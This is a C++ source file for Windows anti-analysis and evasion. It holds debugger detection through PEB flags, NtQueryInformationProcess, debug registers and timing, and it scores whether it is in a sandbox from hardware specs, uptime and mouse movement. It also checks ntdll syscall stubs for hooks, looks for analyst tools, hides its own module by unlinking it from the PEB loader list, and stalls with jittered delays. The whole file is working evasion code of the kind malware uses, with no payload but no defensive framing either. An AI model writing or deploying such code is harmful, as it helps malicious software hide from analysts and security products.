#include "evasion.h"
#include <windows.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <cmath>
#include <random>
#include <chrono>
#include <cstring>
#include <cstdio>

#pragma comment(lib, "iphlpapi.lib")

#ifndef CONTAINING_RECORD
#define CONTAINING_RECORD(address, type, field) ((type *)( \
                                                  (char*)(address) - \
                                                  (unsigned long long)(&((type *)0)->field)))
#endif

#ifndef NT_SUCCESS
typedef long ntstatus;
#define NT_SUCCESS(Status) (((ntstatus)(Status)) >= 0)
#endif

#define peb_debug_offset 0x02
#define peb_ldr_offset 0x18
#define peb_memorder_offset 0x20

void busywork() {
    volatile long long junk = 0xDEADBEEFDEADBEEF;
    for (int i = 0; i < 150; i++) {
        junk = _rotl64(junk, 13);
        junk ^= 0xABCDEF1234567890;
        junk = ~junk;
        junk = _rotr64(junk, 7);
        junk += 0x1111111111111111;
        junk = _byteswap_uint64(junk);
    }
}

unsigned long long cpuspeed() {
    static unsigned long long frequency = 0;
    if (frequency == 0) {
        unsigned long long start = __rdtsc();
        Sleep(100);
        unsigned long long end = __rdtsc();
        frequency = (end - start) / 100000;
    }
    return frequency;
}

void waittime(uint32_t ms, float variance) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> dis(1.0 - variance, 1.0 + variance);
    uint32_t jittered = static_cast<uint32_t>(ms * dis(gen));
    unsigned long long cycles = jittered * cpuspeed();
    unsigned long long start = __rdtsc();

    while ((__rdtsc() - start) < cycles) {
        busywork();
        if (GetTickCount64() % 1000 < 10) {
            SwitchToThread();
        }
    }
}

float checkresources() {
    float score = 0.0f;
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors >= 4 && sysinfo.dwNumberOfProcessors <= 16) {
        score += 0.2f;
        if (sysinfo.dwNumberOfProcessors % 2 != 0) score += 0.1f;
    }

    MEMORYSTATUSEX memstatus;
    memstatus.dwLength = sizeof(memstatus);
    GlobalMemoryStatusEx(&memstatus);
    uint64_t gb4 = 4ULL * 1024 * 1024 * 1024;
    uint64_t gb64 = 64ULL * 1024 * 1024 * 1024;
    if (memstatus.ullTotalPhys > gb4 && memstatus.ullTotalPhys < gb64) {
        float memscore = 0.3f * (1.0f - (float)(memstatus.ullTotalPhys - gb4) / (gb64 - gb4));
        score += memscore;
    }

    unsigned long uptime = GetTickCount() / 60000;
    if (uptime > 90 && uptime < 180) {
        score += 0.3f;
    }
    else if (uptime > 30 && uptime < 480) {
        score += 0.1f;
    }

    ULARGE_INTEGER freebytes;
    if (GetDiskFreeSpaceExA("C:\\", NULL, NULL, &freebytes)) {
        if (freebytes.QuadPart > 25ULL * 1024 * 1024 * 1024) {
            score += 0.2f;
        }
    }

    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float watchmouse() {
    const int samples = 12;
    POINT positions[samples];
    double entropy = 0.0;
    int totalmove = 0;
    int changes = 0;

    for (int i = 0; i < samples; i++) {
        GetCursorPos(&positions[i]);
        waittime(80 + (i * 40), 0.3f);
    }

    int lastdx = 0, lastdy = 0;
    for (int i = 1; i < samples; i++) {
        int dx = positions[i].x - positions[i - 1].x;
        int dy = positions[i].y - positions[i - 1].y;
        int distance = abs(dx) + abs(dy);
        totalmove += distance;

        if (distance > 0) {
            double angle = atan2(dy, dx);
            entropy += abs(sin(angle)) + abs(cos(angle));

            if ((dx * lastdx < 0) || (dy * lastdy < 0)) {
                changes++;
            }
            lastdx = dx;
            lastdy = dy;
        }
    }

    float score = 0.0f;
    if (totalmove > 150) score += 0.3f;
    if (entropy > 3.0) score += 0.3f;
    if (changes > samples / 2) score += 0.2f;
    if (entropy / samples > 0.4) score += 0.2f;

    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float checkapihooks() {
    float score = 1.0f;
    const char* apis[] = {
        "NtQueryInformationProcess",
        "NtSetInformationThread",
        "NtCreateFile",
        "NtReadFile",
        "NtWriteFile",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory"
    };

    void* ntdll = GetModuleHandleA("ntdll.dll");
    for (int i = 0; i < 7; i++) {
        void* apifunc = GetProcAddress((HMODULE)ntdll, apis[i]);
        if (apifunc) {
            unsigned char* code = (unsigned char*)apifunc;

            if (code[0] == 0xE9 || code[0] == 0xCC) {
                score -= 0.15f;
                continue;
            }

            if (code[0] == 0x48 && code[1] == 0xB8) {
                score -= 0.2f;
                continue;
            }

            if (memcmp(code, "\x4C\x8B\xD1\xB8", 4) == 0) {
                continue;
            }

            unsigned long oldprotect;
            if (VirtualProtect(code, 32, PAGE_EXECUTE_READWRITE, &oldprotect)) {
                unsigned char orig = code[0];
                code[0] ^= 0x90;
                if (code[0] != (orig ^ 0x90)) {
                    score -= 0.3f;
                }
                code[0] = orig;
                VirtualProtect(code, 32, oldprotect, &oldprotect);
            }
        }
    }

    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float finddebugs() {
    float score = 1.0f;
    printf("starting debug detection checks...\n");

    if (IsDebuggerPresent()) {
        score -= 0.4f;
        printf("debugger found via isdebugger (-0.4)\n");
    }
    
    int remotedebug = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remotedebug);
    if (remotedebug) {
        score -= 0.3f;
        printf("remote debugger found (-0.3)\n");
    }

    unsigned char* peb = (unsigned char*)__readgsqword(0x60);
    if (peb[peb_debug_offset]) {
        score -= 0.2f;
        printf("peb debug flag set (-0.2)\n");
    }
    
    unsigned long ntglobalflag = *(unsigned long*)(peb + 0xBC);
    if (ntglobalflag & 0x70) {
        score -= 0.2f;
        printf("peb ntglobalflag shows debugging (-0.2)\n");
    }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            score -= 0.3f;
            printf("hardware debug registers found (-0.3)\n");
        }
    }

    void* ntdll = GetModuleHandleA("ntdll.dll");
    void* queryproc = GetProcAddress((HMODULE)ntdll, "NtQueryInformationProcess");
    if (queryproc) {
        typedef ntstatus(__stdcall* queryproc_t)(void*, unsigned long, void*, unsigned long, unsigned long*);
        auto queryinfo = (queryproc_t)queryproc;

        unsigned long debugport = 0;
        ntstatus status = queryinfo(GetCurrentProcess(), 7, &debugport, sizeof(debugport), NULL);
        if (NT_SUCCESS(status) && debugport != 0) {
            score -= 0.4f;
            printf("debug port found via ntquery (-0.4)\n");
        }

        unsigned long debugflags = 0;
        status = queryinfo(GetCurrentProcess(), 0x1f, &debugflags, sizeof(debugflags), NULL);
        if (NT_SUCCESS(status) && debugflags == 0) {
            score -= 0.3f;
            printf("debug flags show debugging (-0.3)\n");
        }
    }

    unsigned long long start = __rdtsc();
    waittime(2, 0.1f);
    unsigned long long end = __rdtsc();
    if ((end - start) > (cpuspeed() * 3)) {
        score -= 0.3f;
        printf("timing analysis suggests debugging/virtualization (-0.3)\n");
    }

    __try {
        __debugbreak();
        score -= 0.2f;
        printf("debugbreak executed without exception (-0.2)\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}

    printf("debug detection final score: %.2f\n", score);
    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float checkenv() {
    float score = 0.5f;
    printf("starting environment context evaluation...\n");

    char domain[256] = { 0 };
    unsigned long size = sizeof(domain);
    if (GetEnvironmentVariableA("USERDOMAIN", domain, size) > 0) {
        if (strlen(domain) > 3) {
            score += 0.2f;
            printf("domain name looks legit: %s (+0.2)\n", domain);
        }
    }

    const char* tools[] = { "devenv.exe", "vscode.exe", "ida64.exe", "x64dbg.exe", "ollydbg.exe", "procmon.exe", "wireshark.exe" };
    for (int i = 0; i < 7; i++) {
        if (GetModuleHandleA(tools[i]) != NULL) {
            score -= 0.15f;
            printf("dev tool detected: %s (-0.15)\n", tools[i]);
        }
    }

    SYSTEMTIME localtime;
    GetLocalTime(&localtime);
    if (localtime.wHour >= 8 && localtime.wHour <= 18) {
        score += 0.1f;
        printf("execution during business hours (+0.1)\n");
    } else {
        printf("execution outside business hours (no bonus)\n");
    }

    printf("environment context final score: %.2f\n", score);
    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

envstats getenvstats() {
    envstats stats = { 0 };

    stats.integrity = checkapihooks();
    waittime(300 + (GetTickCount() % 700), 0.4f);

    stats.debug = finddebugs();
    waittime(400 + (GetTickCount() % 600), 0.3f);

    stats.sandbox = checkresources();
    stats.user = watchmouse();

    waittime(600 + (GetTickCount() % 900), 0.2f);

    float contextscore = checkenv();
    stats.overall = (
        stats.debug * 0.25f +
        stats.sandbox * 0.20f +
        stats.integrity * 0.25f +
        stats.user * 0.20f +
        contextscore * 0.10f
        );

    return stats;
}

runmode pickmode(float confidence) {
    if (confidence >= 0.8f) return fullmode;
    if (confidence >= 0.6f) return halfmode;
    if (confidence >= 0.4f) return slowmode;
    return stopmode;
}

void runmode_action(runmode mode) {
    switch (mode) {
    case fullmode:
        waittime(100 + (GetTickCount() % 400), 0.2f);
        break;
    case halfmode:
        waittime(1500 + (GetTickCount() % 2000), 0.3f);
        break;
    case slowmode:
        waittime(4000 + (GetTickCount() % 6000), 0.4f);
        break;
    case stopmode:
        waittime(15000 + (GetTickCount() % 30000), 0.5f);
        break;
    }
}

unsigned long __stdcall background_loop(void* unused) {
    while (true) {
        envstats current = getenvstats();
        runmode mode = pickmode(current.overall);
        runmode_action(mode);

        uint32_t sleeptime = 8000 + static_cast<uint32_t>((1.0f - current.overall) * 35000);
        waittime(sleeptime, 0.3f);
    }
    return 0;
}

void selfcheck() {
    void* base = GetModuleHandle(NULL);
    auto dosheader = (IMAGE_DOS_HEADER*)base;
    auto ntheaders = (IMAGE_NT_HEADERS*)((char*)base + dosheader->e_lfanew);

    unsigned long checksum = 0xDEADBEEF;
    auto section = IMAGE_FIRST_SECTION(ntheaders);

    for (unsigned short i = 0; i < ntheaders->FileHeader.NumberOfSections; i++) {
        if (section->Characteristics & IMAGE_SCN_CNT_CODE) {
            for (unsigned long j = 0; j < section->SizeOfRawData; j++) {
                checksum = (checksum << 5) + checksum + *((unsigned char*)base + section->VirtualAddress + j);
            }
            break;
        }
        section++;
    }

    if (checksum < 0x10000000) ExitProcess(0);
}

int issafe() {
    envstats stats = getenvstats();
    
    printf("scoring :\n");
    printf("  - debug score: %.2f\n", stats.debug);
    printf("  - sandbox score: %.2f\n", stats.sandbox);
    printf("  - integrity score: %.2f\n", stats.integrity);
    printf("  - user presence score: %.2f\n", stats.user);
    printf("  - overall confidence: %.2f (threshold: 0.60)\n", stats.overall);
    
    if (stats.overall < 0.6f) {
        printf("environment confidence too low (%.2f < 0.6)\n", stats.overall);
        return 0;
    }

    __try {
        __debugbreak();
        printf("debugger detected via debugbreak\n");
        return 0;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("no debugger detected via debugbreak\n");
    }

    printf("environment assessment: safe\n");
    return 1;
}

void hideself(void* modulebase) {
    unsigned char* peb = (unsigned char*)__readgsqword(0x60);
    unsigned char* ldr = *(unsigned char**)(peb + peb_ldr_offset);
    
    if (!ldr) return;
    
    auto modulelist = (LIST_ENTRY*)(ldr + peb_memorder_offset);
    
    for (auto entry = modulelist->Flink; entry != modulelist; entry = entry->Flink) {
        unsigned char* moduleentry = (unsigned char*)entry - 0x10;
        void* dllbase = *(void**)(moduleentry + 0x30); 
        
        if (dllbase == modulebase) {
            entry->Blink->Flink = entry->Flink;
            entry->Flink->Blink = entry->Blink;
            break;
        }
    }
}

void startevasion() {
    float initialdebug = finddebugs();
    if (initialdebug < 0.4f)
        waittime(45000 + (GetTickCount() % 30000), 0.4f);
}
